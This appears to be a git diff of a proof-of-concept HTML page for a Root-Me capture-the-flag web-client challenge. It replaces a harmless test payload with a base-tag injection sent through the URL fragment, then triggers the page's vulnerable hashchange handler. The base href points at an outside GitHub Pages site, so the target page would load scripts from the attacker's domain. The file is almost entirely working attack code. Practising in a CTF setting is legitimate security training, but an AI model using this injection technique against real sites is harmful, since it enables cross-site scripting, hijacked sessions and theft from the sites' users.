@@ -2,16 +2,10 @@
 <html>
   <body>
     <script>
-      // RAW payload (not URI-encoded)
-      const payload = '<h1 style="color:red">XSS</h1>';
-
-      // Go to target with raw payload (browser will encode it properly in URL)
+      const payload = '<base href="https://akshitkakani.github.io/xss-poc/">';
       location.href = 'http://challenge01.root-me.org/web-client/ch62/#' + payload;
-
-      // Trigger hashchange after 1 second
       setTimeout(() => {
-        // Just change hash to force the hashchange listener
-        location.hash += ' ';
+        location.hash += ''; // Triggers vulnerable hashchange event
       }, 1000);
     </script>
   </body>
